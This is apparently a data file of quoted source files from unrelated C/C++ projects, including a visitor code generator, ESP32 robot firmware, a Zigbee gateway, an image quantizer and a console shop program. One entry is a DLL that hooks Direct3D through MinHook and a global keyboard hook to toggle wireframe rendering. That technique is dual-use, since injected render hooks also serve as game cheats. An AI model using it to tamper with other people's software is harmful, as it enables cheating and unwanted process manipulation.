: subclasses) {\n\t\theaderFile << \"class \" << subclassName << \";\"\n\t\t\t\t   << \"\\n\";\n\t}\n\n\t// ExprVisitor or StmtVisitor\n\theaderFile << \"class \" << baseName << \"Visitor{\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"public:\"\n\t\t\t   << \"\\n\";\n\tfor (const std::string &subclassName : subclasses) {\n\t\t// e.g. virtual void visitBinaryExpr(const Binary &expr) = 0;\n\t\t// e.g. virtual void visitPrintStmt(const Print &stmt) = 0;\n\t\theaderFile << \"virtual void visit\" << subclassName << baseName\n\t\t\t\t   << \"(const \" << subclassName << \" &\" << baseName << \") = 0;\"\n\t\t\t\t   << \"\\n\";\n\t}\n\theaderFile << \" };\"\n\t\t\t   << \"\\n\";\n\n\t// Start of abstract class definition\n\theaderFile << \"class \" << baseName << \"{\"\n\t\t\t   << \"\\n\";\n\t// Define the public section of the class\n\theaderFile << \"public:\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"virtual ~\" << baseName << \"() = default;\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"virtual void accept(\" << baseName << \"Visitor &visitor) = 0;\"\n\t\t\t   << \"\\n\";\n\t// End of abstract class definition\n\theaderFile << \"};\"\n\t\t\t   << \"\\n\";\n\n\t// Define the subclasses\n\t// For each type in the vector\n\t// Types = subclasses, fields = params of subclasses constructors\n\t// E.g. Binary : Expr left, Token op, Expr right\n\tfor (const std::string &type : types) {\n\t\tstd::string className = type.substr(0, type.find(\":\") - 1);\n\t\tstd::string fields = type.substr(type.find(\":\") + 1);\n\t\tdefineType(headerFile, baseName, className, fields);\n\t}\n\n\t// End of guard (end of file)\n\theaderFile << \"#endif\"\n\t\t\t   << \"\\n\";\n\n\t// Close the file\n\theaderFile.close();\n}\n\nvoid defineType(std::ofstream &headerFile, std::string &baseName,\n\t\t\t\tstd::string &className, std::string &fieldList) {\n\t// Extract the fields\n\t// Vector of <type, name>, e.g. {Expr, left}, {Token, op}, {Expr, right}\n\tstd::vector<std::pair<std::string, std::string>> fields;\n\tstd::istringstream iss(fieldList);\n\tstd::string field;\n\n\twhile (std::getline(iss, field, ','))  // Takes in params by reference\n\t{\n\t\t// Remove leading/trailing whitespaces\n\t\tfield = field.substr(field.find_first_not_of(\" \"),\n\t\t\t\t\t\t\t field.find_last_not_of(\" \") + 1);\n\t\tstd::string type = field.substr(0, field.find(\" \"));\n\t\tstd::string name = field.substr(field.find(\" \") + 1);\n\t\tfields.push_back(std::make_pair(type, name));\n\t}\n\n\tstd::string constructorParams;\n\tstd::string initializationParams;\n\n\t// Start class\n\theaderFile << \"class \" << className << \" : public \" << baseName << \" {\"\n\t\t\t   << \"\\n\";\n\theaderFile << \"public:\"\n\t\t\t   << \"\\n\";\n\n\t// Define the fields\n\t// E.g. Expr left; Token op; Expr right;\n\tfor (const auto &field : fields) {\n\t\t// NOTE: Structured bindings\n\t\tauto &[type, name] = field;\n\t\theaderFile << type << \" \" << name << \";\"\n\t\t\t\t   << \"\\n\";\n\n\t\t// If type contains vector of unique_ptr then manually construct the\n\t\t// vector\n\t\tif (type.find(\"unique_ptr\") != std::string::npos) {\n\t\t\t// E.g. Binary(std::unique_ptr<Expr> &left, Token op,\n\t\t\t// std::unique_ptr<Expr> &right);\n\t\t\tconstructorParams += type + \" &\" + name;\n\t\t\tinitializationParams += name + \"(std::move(\" + name + \"))\";\n\t\t} else {\n\t\t\tconstructorParams += type + \" \" + name;\n\t\t\t// If raw ptr then don't do *ptr( *ptr ), just ptr(ptr)\n\t\t\t// Example: void *literal; -> literal(literal)\n\t\t\tif (type.find(\"*\") != std::string::npos) {\n\t\t\t\tstd::string temp = name.substr(1);\n\t\t\t\tinitializationParams += temp + \"(\" + temp + \")\";\n\t\t\t} else\n\t\t\t\tinitializationParams += name + \"(\" + name + \")\";\n\t\t}\n\n\t\t// Add commas if not the last field\n\t\tif (field != fields.back()) {\n\t\t\tconstructorParams += \", \";\n\t\t\tinitializationParams += \", \";\n\t\t}\n\t}\n\theaderFile << \"\\n\";\n\n\t// E.g. Binary(std::unique_ptr<Expr> left, Token op, std::unique_ptr<Expr>\n\t// right) : left(std::move(left)), op(op), right(std::move(r",
    "// SSR1-P_TCode_ESP32_Beta1\n// by TempestMAx 20-11-2024\n// Please copy, share, learn, innovate, give attribution.\n// Decodes T-code commands and uses them to control servos a single brushless\n// motor It can handle:\n//   3x linear channels (L0, L1, L2)\n//   3x rotation channels (R0, R1, R2)\n//   3x vibration channels (V0, V1, V2)\n//   3x auxilliary channels (A0, A1, A2)\n// This code is designed to drive the SSR1 stroker robot, but is also intended\n// to be used as a template to be adapted to run other t-code controlled arduino\n// projects Have fun, play safe! History: Alpha1 - First release. 2-2-2023\n// Alpha2 - Encoder moved to PIN33, End switch pin removed and start sequence\n// changed. 23-2-2023 Alpha3 - SPI feedback by default added. PWM feedback\n// switched to the native SFOC function. \"Magic numbers\" moved to the top of the\n// code.\n//          Code extensively tided up and comments added/improved. 16-5-2023\n// Alpha4 - SSI feedback from MT6701 now default, but AS5048a still supported.\n// 28-6-2023 Beta1 - Switch to ESP32-S3-Zero, all pins changed. Only MT6701\n// tested so far! 20-11-2024\n\n// ----------------------------\n//  User Settings\n// ----------------------------\n// These are the setup parameters for the SSR1 on an ESP32\n\n// Device IDs, for external reference\n#define FIRMWARE_ID \\\n    \"SSR1-P_TCode_ESP32_Beta1.ino\"  // Device and firmware version\n#define TCODE_VER \"TCode v0.3\"      // Current version of TCode\n\n// Set to 00000000 for no PCB\n#define PCB_VERSION 000103000\n\n#define Encoder_PWM_PIN -1  // PWM feedback pin (if used) - P pad on AS5048a\n#define ChipSelect_PIN \\\n    5  // SPI chip select pin - CSn on AS5048a (By default on ESP32-S3: MISO =\n        // D13, MOSI = D11, CLK = D12)\n#define Enable_PIN 4       // Motor enable - EN on SFOCMini\n#define PWMchannel1_PIN 2  // Motor channel 1 - IN1 on SFOCMini\n#define PWMchannel2_PIN 16  // Motor channel 2 - IN2 on SFOCMini\n#define PWMchannel3_PIN 17  // Motor channel 3 - IN3 on SFOCMini\n// HACK FOR PCB v1.2\n#define SSIData_PIN 19\n#define SSIClock_PIN 18\n\n// Drive Parameters\n#define MotorA_Supply 20\n#define MotorA_Voltage 12  // Motor operating voltage (12-20V)\n#define MotorA_Current 1   // Maximum operating current (Amps)\n// The control code needs to know the angle of the motor relative to the encoder\n// - \"Zero elec. angle\". If a value is not entered it will perform a quick\n// operation on startup to estimate this. This will be displayed in the serial\n// monitor each time the device starts up. If the device is noticably faster in\n// one direction the angle is out of alignment, try increasing or decreasing it\n// by small increments (eg +/- 0.1).\n#define MotorA_ParametersKnown \\\n    false  // Once you know the zero elec angle for the motor enter it below and\n           // set this flag to true.\n#define MotorA_ZeroElecAngle \\\n    2.75  // This number is the zero angle (in radians) for the motor relative\n          // to the encoder.\n#define MotorA_SensorDirection \\\n    Direction::CW  // Do not change. If the motor is showing CCW rotate the\n                   // motor connector 180 degrees to reverse the motor.\n#define SensorA_UseMT6701 \\\n    true  // Use the MT6701 encoder via SSI rather than the default AS5048a\n          // encoder via SPI.\n#define SensorA_UsePWM \\\n    false  // SPI feedback on the AS5048a is default because it's a lot smoother\n           // and quieter! Change this to true if you want to use PWM feedback.\n\n// Control constants\n// (a.k.a. magic numbers for Eve)\n#define RAIL_LENGTH 125          // Physical maximum travel of the receiver (mm)\n#define STROKE_LENGTH 120        // Operating stroke length (mm)\n#define PULLEY_CIRCUMFERENCE 60  // Drive pulley circumference (mm)\n#define P_CONST 0.002            // Motor PID proportional constant\n#define LOW_PASS \\\n    0.8  // Low pass filter factor for static noise reduction ( number < 1, 0 =\n         // none)\n// Derived constants\n#define ANG_TO_POS                   \\\n    (10000 * PULLEY_CIRCUMFERENCE) / \\\n        (2 * 3.14159 * STROKE_LENGTH)  // Number to convert a motor angle to a\n                                       // 0-10000 axis position\n#define START_OFFSET                              \\\n    2 * 3.14159 * (RAIL_LENGTH - STROKE_LENGTH) / \\\n        (2 *                                      \\\n         PULLEY_CIRCUMFERENCE)  // Offset angle from endstop on startup (rad)\n\n// Other functions\n#define MIN_SMOOTH_INTERVAL \\\n    3  // Minimum auto-smooth ramp interval for live commands (ms)\n#define MAX_SMOOTH_INTERVAL \\\n    100  // Maximum auto-smooth ramp interval for live commands (ms)\n\n// T-Code Channels\n#define CHANNELS 3  // Number of channels of each type (LRVA)\n\n// Libraries used\n#include <Wire.h>\n#include <EEPROM.h>     // Permanent memory\n#include <BLDCMotor.h>  // Motor controller code\n#include <drivers/BLDCDriver3PWM.h>\n\n#include <SimpleFOCDrivers.h>\n#include <encoders/MT6701/MagneticSensorMT6701SSI.h>\n\n// -----------------------------\n// Class to handle each axis\n// ----------",
    "#include \"ZigbeeGateway.h\"\r\n#if SOC_IEEE802154_SUPPORTED \r\n//&& CONFIG_ZB_ENABLED\r\n\r\n// Initialize the static instance of the class\r\nZigbeeGateway *ZigbeeGateway::_instance = nullptr;\r\n\r\nfindcb_userdata_t ZigbeeGateway::findcb_userdata;\r\nbool ZigbeeGateway::_last_bind_success = false;\r\nbool ZigbeeGateway::_in_binding = false;\r\nbool ZigbeeGateway::_new_device_joined = false;\r\nuint16_t ZigbeeGateway::_clusters_2_discover = 0;\r\nuint16_t ZigbeeGateway::_attributes_2_discover = 0;\r\nuint16_t ZigbeeGateway::_endpoints_2_bind = 0;\r\nuint16_t ZigbeeGateway::_clusters_2_bind = 0;\r\nuint8_t ZigbeeGateway::_binding_error_retries = 0;\r\nquery_basic_cluster_data_t ZigbeeGateway::_last_device_query;\r\nuint8_t ZigbeeGateway::_read_attr_last_tsn = 0;\r\nesp_zb_zcl_attribute_t ZigbeeGateway::_read_attr_last_result;\r\n//\r\n\r\n#define ZB_CMD_TIMEOUT 10000\r\n\r\nSemaphoreHandle_t ZigbeeGateway::gt_lock;\r\n\r\nZigbeeGateway::ZigbeeGateway(uint8_t endpoint) : ZigbeeEP(endpoint) {\r\n  _device_id = ESP_ZB_HA_HOME_GATEWAY_DEVICE_ID; \r\n  _instance = this;  // Set the static pointer to this instance\r\n  \r\n  _new_device_joined = false;\r\n  _last_bind_success = false;\r\n\r\n  _clusters_2_discover = 0;\r\n  _attributes_2_discover = 0;\r\n\r\n  _joined_devices.clear();\r\n  _gateway_devices.clear();\r\n\r\n  #if !CONFIG_DISABLE_HAL_LOCKS\r\n  if (!gt_lock) {\r\n    gt_lock = xSemaphoreCreateBinary();\r\n    if (gt_lock == NULL) {\r\n      log_e(\"Semaphore creation failed\");\r\n    }\r\n  }\r\n  #endif\r\n\r\n\r\n  //use custom config to avoid narrowing error -> must be fixed in zigbee-sdk\r\n  esp_zb_configuration_tool_cfg_t gateway_cfg = ZB_DEFAULT_GATEWAY_CONFIG();\r\n\r\n  esp_zb_ias_zone_cluster_cfg_t zone_cfg = {\r\n        .zone_state   = 0,\r\n        .zone_type    = 0x0016,// SS_IAS_ZONE_TYPE_DOOR_WINDOW_HANDLE\r\n        .zone_status  = 0,\r\n        .ias_cie_addr = ESP_ZB_ZCL_ZONE_IAS_CIE_ADDR_DEFAULT,\r\n        .zone_id      = 0xFF,\r\n    };\r\n\r\n  esp_zb_on_off_switch_cfg_t switch_cfg = ESP_ZB_DEFAULT_ON_OFF_SWITCH_CONFIG();\r\n\r\n  \r\n  esp_zb_attribute_list_t poll_cluster;\r\n  //esp_zb_attribute_list_t tuya_private_cluster0;\r\n  //esp_zb_attribute_list_t tuya_private_cluster1;\r\n\r\n  //tuya_private_cluster0.attribute.id = 0xD001;\r\n  //tuya_private_cluster0.cluster_id = 0xE001;\r\n  //tuya_private_cluster0.next = NULL;\r\n  \r\n  esp_zb_on_off_cluster_cfg_t on_off_cfg;\r\n  on_off_cfg.on_off = ESP_ZB_ZCL_ON_OFF_ON_OFF_DEFAULT_VALUE;\r\n\r\n  esp_zb_time_cluster_cfg_t time_cfg;\r\n  time_cfg.time = ESP_ZB_ZCL_TIME_TIME_DEFAULT_VALUE;\r\n  time_cfg.time_status = ESP_ZB_ZCL_TIME_TIME_STATUS_DEFAULT_VALUE;\r\n\r\n  esp_zb_level_cluster_cfg_t level_cfg;\r\n  level_cfg.current_level = ESP_ZB_ZCL_LEVEL_CONTROL_CURRENT_LEVEL_DEFAULT_VALUE;\r\n\r\n  esp_zb_groups_cluster_cfg_t groups_cfg;\r\n  groups_cfg.groups_name_support_id = ESP_ZB_ZCL_GROUPS_NAME_SUPPORT_DEFAULT_VALUE;\r\n\r\n  esp_zb_scenes_cluster_cfg_t scenes_cfg; \r\n  scenes_cfg.scenes_count = ESP_ZB_ZCL_SCENES_SCENE_COUNT_DEFAULT_VALUE;         \r\n  scenes_cfg.current_scene = ESP_ZB_ZCL_SCENES_CURRENT_SCENE_DEFAULT_VALUE;         \r\n  scenes_cfg.current_group = ESP_ZB_ZCL_SCENES_CURRENT_GROUP_DEFAULT_VALUE;         \r\n  scenes_cfg.scene_valid = ESP_ZB_ZCL_SCENES_SCENE_VALID_DEFAULT_VALUE;             \r\n  scenes_cfg.name_support = ESP_ZB_ZCL_SCENES_NAME_SUPPORT_DEFAULT_VALUE;\r\n\r\n  esp_zb_color_cluster_cfg_t color_control_cfg;\r\n  \r\n\r\n  _cluster_list = esp_zb_zcl_cluster_list_create();\r\n  esp_zb_attribute_list_t *basic_cluster = esp_zb_basic_cluster_create(&(gateway_cfg.basic_cfg));\r\n  esp_zb_cluster_list_add_basic_cluster(_cluster_list, basic_cluster, ESP_ZB_ZCL_CLUSTER_SERVER_ROLE);\r\n  esp_zb_cluster_list_add_basic_cluster(_cluster_list, esp_zb_basic_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_identify_cluster(_cluster_list, esp_zb_identify_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_identify_cluster(_cluster_list, esp_zb_zcl_attr_list_create(ESP_ZB_ZCL_CLUSTER_ID_IDENTIFY), ESP_ZB_ZCL_CLUSTER_SERVER_ROLE);\r\n  esp_zb_cluster_list_add_power_config_cluster(_cluster_list, esp_zb_power_config_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_scenes_cluster(_cluster_list, esp_zb_scenes_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_groups_cluster(_cluster_list, esp_zb_groups_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_scenes_cluster(_cluster_list, esp_zb_scenes_cluster_create(&scenes_cfg), ESP_ZB_ZCL_CLUSTER_SERVER_ROLE);\r\n  esp_zb_cluster_list_add_groups_cluster(_cluster_list, esp_zb_groups_cluster_create(&groups_cfg), ESP_ZB_ZCL_CLUSTER_SERVER_ROLE);\r\n  esp_zb_cluster_list_add_level_cluster(_cluster_list, esp_zb_level_cluster_create(NULL), ESP_ZB_ZCL_CLUSTER_CLIENT_ROLE);\r\n  esp_zb_cluster_list_add_level_cluster(_cluster_list, esp_zb_level_cluster_create(&level_cfg), ESP_ZB_ZCL_CLUSTER_SERVER_ROLE);\r\n  esp_zb_cluster_list_add_color_control_cluster(_cluster_list, esp_zb_color_control_cluster_create(NULL), ESP_ZB_ZC",
    "#include \"Scalar_non-uniform_Quantization.h\"\r\n\r\nvoid Image::Set_Bit(int Bit)\r\n{\r\n\tm_iBit = Bit;\r\n}\r\n\r\nvoid Image::Set_Ch(int Channel)\r\n{\r\n\tm_iCh = Channel;\r\n}\r\n\r\nvoid Image::Set_Size(int height, int width)\r\n{\r\n\tfor (int i = 0; i < 3; i++)\r\n\t{\r\n\t\tif (i == 0)\r\n\t\t\tm_iSize[i] = height * width;\r\n\t\telse\r\n\t\t\tm_iSize[i] = (height / 2) * (width / 2);\r\n\t}\r\n}\r\n\r\nvoid Image::Initiate_Vector()\r\n{\r\n\tm_ui16Comp.resize(m_iCh, vector<unsigned short>(HEIGHT * WIDTH, 0));\r\n\tm_ui8Comp.resize(m_iCh, vector<unsigned char>(HEIGHT * WIDTH * 2, 0));\r\n}\r\n\r\nvoid Image::readOneFrame(FILE* file)\r\n{\r\n\tint bitFactor = (m_iBit <= 8) ? 1 : 2;\r\n\r\n\tfor (int ch = 0; ch < m_iCh; ch++)\r\n\t{\r\n\t\tfread(&(m_ui8Comp[ch][0]), sizeof(unsigned char), m_iSize[ch] * bitFactor, file);\r\n\r\n\t\tif (m_iBit == 10)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i < m_iSize[ch]; i++)\r\n\t\t\t\tm_ui16Comp[ch][i] = (m_ui8Comp[ch][i * 2] + (m_ui8Comp[ch][i * 2 + 1] << 8));\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Image::Quantization(FILE* file)\r\n{\r\n\t// Lloyd-Max Algorithm Initialization\r\n\tconst int numLevels = 256;\t// Number of quantization levels for 8-bit\r\n\tdouble minValue = 0.0;\r\n\tdouble maxValue = 1023.0;\t// 10-bit MAX value\r\n\tdouble stepSize = (maxValue - minValue) / numLevels;\r\n\r\n\tvector<double> decision_Levels(numLevels + 1);\r\n\tvector<double> reconstruction_Levels(numLevels);\r\n\r\n\t// Initialize decision levels and reconstruction levels\r\n\tfor (int i = 0; i < numLevels + 1; i++)\r\n\t\tdecision_Levels[i] = minValue + i * stepSize;\r\n\r\n\tfor (int i = 0; i < numLevels; i++)\r\n\t\treconstruction_Levels[i] = (decision_Levels[i] + decision_Levels[i + 1]) / 2.0;\r\n\r\n\t// Interative Lloyd-Max Optimization\r\n\tfor (int iteration = 0; iteration < 10; iteration++)\r\n\t{\r\n\t\t// Update reconstruction levels(centroids)\r\n\t\tfor (int i = 0; i < numLevels; i++)\r\n\t\t{\r\n\t\t\tdouble sum = 0.0;\r\n\t\t\tint count = 0;\r\n\r\n\t\t\tfor (int ch = 0; ch < m_iCh; ch++) {\r\n\t\t\t\tfor (int j = 0; j < m_iSize[ch]; j++) {\r\n\t\t\t\t\tif (m_ui16Comp[ch][j] >= decision_Levels[i] && m_ui16Comp[ch][j] < decision_Levels[i + 1]) {\r\n\t\t\t\t\t\tsum += m_ui16Comp[ch][j];\r\n\t\t\t\t\t\tcount++;\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tif (count > 0)\r\n\t\t\t\treconstruction_Levels[i] = sum / count;\r\n\t\t}\r\n\r\n\t\t// Update decision Levels (midpoints)\r\n\t\tfor (int i = 1; i < numLevels; i++)\r\n\t\t\tdecision_Levels[i] = (reconstruction_Levels[i - 1] + reconstruction_Levels[i]) / 2.0;\r\n\t}\r\n\r\n\t// Quantization process\r\n\tfor (int ch = 0; ch < m_iCh; ch++) {\r\n\t\tfor (int i = 0; i < m_iSize[ch]; i++) {\r\n\t\t\tfor (int level = 0; level < numLevels; level++) {\r\n\t\t\t\tif (m_ui16Comp[ch][i] >= decision_Levels[level] && m_ui16Comp[ch][i] < decision_Levels[level + 1]) {\r\n\t\t\t\t\tm_ui16Comp[ch][i] = static_cast<unsigned short>(reconstruction_Levels[level]);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// Write quantized data to file\r\n\t\tfwrite(&(m_ui16Comp[ch][0]), sizeof(unsigned short), m_iSize[ch], file);\r\n\t}\r\n}\r\n\r\nvoid Image::Reconstruction()\r\n{\r\n\t// Reconstruct using stored reconstruction levels\r\n\tconst int numLevels = 256; // Number of quantization levels for 8-bit\r\n\tdouble minValue = 0;\r\n\tdouble maxValue = 1023;\r\n\tdouble stepSize = (maxValue - minValue) / numLevels;\r\n\r\n\tvector<double> decision_Levels(numLevels + 1);\r\n\tvector<double> reconstruction_Levels(numLevels);\r\n\r\n\t// Initialize decision levels and reconstruction levels\r\n\tfor (int i = 0; i <= numLevels; i++) {\r\n\t\tdecision_Levels[i] = minValue + i * stepSize;\r\n\t}\r\n\tfor (int i = 0; i < numLevels; i++) {\r\n\t\treconstruction_Levels[i] = (decision_Levels[i] + decision_Levels[i + 1]) / 2.0;\r\n\t}\r\n\r\n\t// Reconstruct image\r\n\tfor (int ch = 0; ch < m_iCh; ch++) {\r\n\t\tfor (int i = 0; i < m_iSize[ch]; i++) {\r\n\t\t\tfor (int level = 0; level < numLevels; level++) {\r\n\t\t\t\tif (m_ui16Comp[ch][i] >= decision_Levels[level] && m_ui16Comp[ch][i] < decision_Levels[level + 1]) {\r\n\t\t\t\t\tm_ui16Comp[ch][i] = static_cast<unsigned short>(reconstruction_Levels[level]);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Image::PSNR()\r\n{\r\n\tdouble sum;\r\n\tdouble MSE;\r\n\tdouble MAX = 1023.0;\r\n\tdouble PSNR;\r\n\tfor (int ch = 0; ch < m_iCh; ch++)\r\n\t{\r\n\t\tsum = 0.0;\r\n\t\tMSE = 0.0;\r\n\t\tPSNR = 0.0;\r\n\r\n\t\tfor (int i = 0; i < m_iSize[ch]; i++)\r\n\t\t\tsum += pow((m_ui16Comp[ch][i] - m_ui8Comp[ch][i]), 2);\r\n\t\tMSE = sum / m_iSize[ch];\r\n\t\tPSNR = 10.0 * log10(pow(MAX, 2) / MSE);\r\n\r\n\t\tif (ch == 0)\r\n\t\t\tcout << \"PSNR of  Y : \" << PSNR << endl;\t\t\t// PSNR of Y\r\n\t\telse if (ch == 1)\r\n\t\t\tcout << \"PSNR of Cb : \" << PSNR << endl;\t\t\t// PSNR of Cb\r\n\t\telse\r\n\t\t\tcout << \"PSNR of Cr : \" << PSNR << endl;\t\t\t// PSNR of Cr\r\n\t}\r\n}",
    "//\n// Copyright (c) 2009-2010 Mikko Mononen memon@inside.org\n//\n// This software is provided 'as-is', without any express or implied\n// warranty.  In no event will the authors be held liable for any damages\n// arising from the use of this software.\n// Permission is granted to anyone to use this software for any purpose,\n// including commercial applications, and to alter it and redistribute it\n// freely, subject to the following restrictions:\n// 1. The origin of this software must not be misrepresented; you must not\n//    claim that you wrote the original software. If you use this software\n//    in a product, an acknowledgment in the product documentation would be\n//    appreciated but is not required.\n// 2. Altered source versions must be plainly marked as such, and must not be\n//    misrepresented as being the original software.\n// 3. This notice may not be removed or altered from any source distribution.\n//\n\n#include <stdlib.h>\n#include \"DetourAlloc.h\"\n\nstatic void *dtAllocDefault(size_t size, dtAllocHint)\n{\n\treturn malloc(size);\n}\n\nstatic void dtFreeDefault(void *ptr)\n{\n\tfree(ptr);\n}\n\nstatic dtAllocFunc* sAllocFunc = dtAllocDefault;\nstatic dtFreeFunc* sFreeFunc = dtFreeDefault;\n\nvoid dtAllocSetCustom(dtAllocFunc *allocFunc, dtFreeFunc *freeFunc)\n{\n\tsAllocFunc = allocFunc ? allocFunc : dtAllocDefault;\n\tsFreeFunc = freeFunc ? freeFunc : dtFreeDefault;\n}\n\nvoid* dtAlloc(size_t size, dtAllocHint hint)\n{\n\treturn sAllocFunc(size, hint);\n}\n\nvoid dtFree(void* ptr)\n{\n\tif (ptr)\n\t\tsFreeFunc(ptr);\n}\n",
    "#include \"GL/D3D9.hpp\"\n#include \"GL/D3D11.hpp\"\n\nstatic HANDLE s_Thread   = nullptr;\nstatic HHOOK  s_Keyboard = nullptr;\nstatic bool   s_Wireframe = false;\n\nbool IsWireframe()\n{\n    return s_Wireframe;\n}\n\nvoid OnInterceptorRun()\n{\n    Trace(L\"Initializing Interceptor...\");\n\n    // Initialize MinHook library and check if the initialization is successful\n    if (MH_Initialize() != MH_OK)\n    {\n        Trace(L\"Can't initialize Minhook\");\n        return;\n    }\n\n    // Create a window for hooking Direct3D API\n    HWND Display = ::CreateWindowExW(\n            0,\n            L\"<Class>\",\n            L\"<Title>\",\n            WS_POPUP,\n            0,\n            0,\n            640,\n            480,\n            nullptr,\n            nullptr,\n            nullptr,\n            nullptr);\n    if (Display == nullptr)\n    {\n        Trace(L\"Can't initialize window\");\n        return;\n    }\n\n    // Intercept Direct3D call(s)\n    D3D9CreateHooks(Display);\n    D3D11CreateHooks(Display);\n\n    // Destroy the created window\n    ::DestroyWindow(Display);\n\n    // Enable all installed hooks using MinHook library\n    MH_EnableHook(MH_ALL_HOOKS);\n\n    // Install Keyboard hook for managing the interceptor\n    static constexpr auto OnKeyboardEvent = [](int Code, WPARAM wParam, LPARAM lParam) -> LRESULT {\n        if ((Code == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))\n        {\n            const KBDLLHOOKSTRUCT * lpEvent = (KBDLLHOOKSTRUCT *) lParam;\n\n            switch (lpEvent->vkCode)\n            {\n            case VK_F1:\n                s_Wireframe = !s_Wireframe;\n                break;\n            }\n        }\n        return CallNextHookEx(s_Keyboard, Code, wParam, lParam);\n    };\n    s_Keyboard = ::SetWindowsHookEx(WH_KEYBOARD_LL, OnKeyboardEvent, nullptr, NULL);\n}\n\nvoid OnInterceptorAttach()\n{\n    // Initialize the thread\n    static constexpr auto OnThreadEntry = [](LPVOID Parameter) -> DWORD {\n        OnInterceptorRun();\n        return 1;\n    };\n    s_Thread = ::CreateThread(nullptr, 0, OnThreadEntry, nullptr, 0, nullptr);\n}\n\nvoid OnInterceptorDetach()\n{\n    // Unhook Keyboard\n    if (s_Keyboard)\n    {\n        ::UnhookWindowsHookEx(s_Keyboard);\n    }\n\n    // Terminate the thread with an exit code of 0\n    if (s_Thread)\n    {\n        ::TerminateThread(s_Thread, 0);\n    }\n\n    // Disable all installed hooks using MinHook library\n    MH_DisableHook(MH_ALL_HOOKS);\n\n    // Uninitialized the MinHook library\n    MH_Uninitialize();\n}\n\nBOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, LPVOID)\n{\n    switch (Reason)\n    {\n    case DLL_PROCESS_ATTACH:\n        OnInterceptorAttach();\n        break;\n    case DLL_PROCESS_DETACH:\n        OnInterceptorDetach();\n        break;\n    default:\n        break;\n    }\n    return true;\n}",
    "// ============ Start =========== //\n#include <iostream>\n#include <string>\n#include <conio.h>\n#include <cstdlib>\n\nusing namespace std;\n// ============= Dtas ============ //\nconst  int Max = 100;\n//__________ Products data _________//\nstruct Products {\n\tint codeProducts;\n\tstring nameProducts;\n\tdouble price;\n\tint inventory;\n};\n\nProducts product[Max];\nint current_p = 0;\n//___________ Customers data ____________//\nstruct Customers {\n\tint codeCustomer;\n\tstring nameCustomer;\n\tstring number;\n};\n\nCustomers customer[Max];\nint current_c = 0;\n//_____________ shopping _________//\nstruct Shopping {\n\tint code;\n\tint customerCode;\n\tstring customername;\n\tstring customerNumber;\n\tint codeProduct;\n\tstring productName;\n\tint inventory;\n\tint price;\n};\n\nShopping shopinng[Max];\nint current_sh = 0;\n// ============= Set Color ======== //\nvoid setColor(const string& colorCode) {\n\tcout << \"\\033[\" << colorCode << \"m\";\n}\n\n// _____________ Add Products _____________ //\nvoid AddProduct() {\n\tint x;\n\tsystem(\"cls\");\n\tsystem(\"color 1F\");\n\n\tsetColor(\"32\");\n\tcout << \"===============================\\n\";\n\tcout << \"\\t Add Products section\\n\";\n\tcout << \"===============================\\n\\n\";\n\n\tcout << \"Please enter how many products do you add: \";\n\tcin >> x;\n\n\tif (current_p + x > Max) {\n\t\tsetColor(\"31\");\n\t\tcout << \"There isn't any space. \\n\\n\";\n\t\tsetColor(\"37\");\n\t\tcout << \"Press any key to continue...\";\n\t\t_getch();\n\t\treturn;\n\t}\n\n\tif (current_p + x < Max) {\n\t\tfor (int i = 0; i < x; i++) {\n\t\t\tcout << \"Enter product (\" << i + 1 << \") name: \";\n\t\t\tcin.ignore();\n\t\t\tgetline(cin, product[current_p + i].nameProducts);\n\n\t\t\tcout << \"Enter product (\" << i++ << \") code: \";\n\t\t\tcin >> product[current_p + i].codeProducts;\n\n\t\t\tcout << \"Enter the product (\" << i + 1 << \") price: \";\n\t\t\tcin >> product[current_p + i].price;\n\n\t\t\tcout << \"Enter product (\" << i + 1 << \") inventory: \";\n\t\t\tcin >> product[current_p + i].inventory;\n\t\t}\n\t\tcurrent_p += x;\n\t\tsetColor(\"32\");\n\t\tcout << \"Successfully added (\" << x << \") product.\\n\";\n\t}\n\telse {\n\t\tsetColor(\"31\");\n\t\tcout << \"There isn't any space.\\n\";\n\t\tsetColor(\"37\");\n\t\tcout << \"Press any key to continue...\";\n\t\t_getch();\n\t\treturn;\n\t}\n}\n// _____________ Products List ____________ //\nvoid ProductList() {\n\tsystem(\"cls\");\n\n\tsystem(\"color 83\");\n\tsetColor(\"32\");\n\tcout << \"===============================\\n\";\n\tcout << \"\\t Products list section\\n\";\n\tcout << \"===============================\\n\\n\";\n\n\tif (current_p == 0) {\n\t\tsetColor(\"31\");\n\t\tcout << \"There isn't any product. \\n\";\n\t\tsetColor(\"37\");\n\t\tcout << \"Press any key to continue...\";\n\t\t_getch();\n\t\treturn;\n\t}\n\tsetColor(\"30\");\n\tfor (int i = 0; i < current_p; i++) {\n\t\tcout << \"Products: \\n\\n\";\n\n\t\tcout << i << \"_ Product\\n\";\n\t\tcout << \"Name:\" << product[i].nameProducts << endl;\n\t\tcout << \"Code: \" << product[i].codeProducts << endl;\n\t\tcout << \"Price: \" << product[i].price << endl;\n\t\tcout << \"Inventory: \" << product[i].inventory << endl;\n\t\tcout << \"<<< ----------------------------------- >>>\\n\";\n\t}\n\n\tsetColor(\"37\");\n\tcout << \"Press any key to contiue...\";\n\t_getch();\n\treturn;\n}\n// ________________ Searchpc _______________ //\nvoid Searchpc() {\n\tint spc;\n\tsystem(\"cls\");\n\tsetColor(\"32\");\n\tcout << 